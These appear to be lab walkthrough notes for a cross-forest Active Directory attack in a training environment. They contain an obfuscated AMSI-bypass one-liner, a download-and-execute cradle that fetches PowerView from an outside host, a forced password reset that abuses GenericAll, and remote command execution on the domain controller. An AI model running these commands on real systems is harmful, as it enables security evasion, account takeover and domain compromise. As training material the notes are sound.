
Task 

• Using the reverse shell on db.local: 
− Execute cross forest attack on dbvendor.local by abusing ACLs 
• Enumerate FSPs for db.local and escalate privileges to DA by compromising the FSPs.



On the reverse shell we have on db-sqlsrv, we can use PowerView to enumerate ACLs. Run the following commands on the reverse shell. We are bypassing AMSI first and then using a download-execute cradle to load PowerView:


```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```


```
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.139/PowerView.ps1')
```

```
Get-ForestTrust
```

```
Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local
```

![[Pasted image 20250325181938.png]]

So, srvdba has GenericAll over dbxsvc users in dbvendor.local domain. We can do many things with GenericAll on a user object like Reset Password, Set SPN on user etc. Reset password of dbxsvc user that matches your student user ID:

```
Set-DomainUserPassword -Identity db139svc - AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) - Domain dbvendor.local –Verbose
```

Sweet! We just got access to the db139svc user in dbvendor.local. Now, let's enumerate FSPs for db.local. Run the below commands on the reverse shell:

```
Find-ForeignGroup –Verbose
```

![[Pasted image 20250325182408.png]]

And no surprise, the FSPs who are part of the built-in Administrators group are the dbxsvc users:

```
Get-DomainUser -Domain dbvendor.local |? {$_.ObjectSid -eq 'S-1-5-21-569087967-1859921580-1949641513-15120'}
```

![[Pasted image 20250325182328.png]]

This means, we can escalate privileges in db.local by using credentials of dbxsvc. We can use winrs or PowerShell Remoting cmdlets. Using winrs on the reverse shell:

```
winrs -r:db-dc.db.local -u:dbvendor\db139svc -p:Password@123 "whoami"
```

![[Pasted image 20250325182601.png]]

Using PowerShell Remoting on the reverse shell:

```
$passwd = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
```

```
$creds = New-Object System.Management.Automation.PSCredential ("dbvendor\db139svc", $passwd)
```

```
 $dbdc = New-PSSession -Computername db-dc.db.local -Credential $creds
```

```
 Invoke-Command -scriptblock{whoami;hostname} -Session $dbdc
```

![[Pasted image 20250325182747.png]]

